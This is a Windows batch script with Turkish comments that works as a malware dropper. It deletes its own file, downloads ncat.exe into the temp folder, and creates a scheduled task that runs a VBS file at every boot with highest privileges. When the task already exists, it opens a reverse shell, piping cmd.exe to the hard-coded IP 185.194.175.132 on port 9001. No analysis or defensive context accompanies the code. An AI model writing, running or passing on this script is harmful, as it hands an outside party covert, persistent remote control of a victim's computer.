@echo off
setlocal

set "marker=%temp%\marker.txt"

REM Görevi kontrol et
schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
set "taskExists=%errorlevel%"

if %taskExists% neq 0 (
    REM Görev YOKSA
    del /f /q "asd.bat"
    cd /d %temp%
    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST

    REM rb.vbs sadece marker yoksa çalışsın
    if not exist "%marker%" (
        start "" "%temp%\rb.vbs"
        echo ran > "%marker%"
    )
) else (
    REM Görev VARSA
    del /f /q "asd.bat"
    cd /d %temp%
    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
    ncat.exe 185.194.175.132 9001 -e cmd.exe
    
)

endlocal
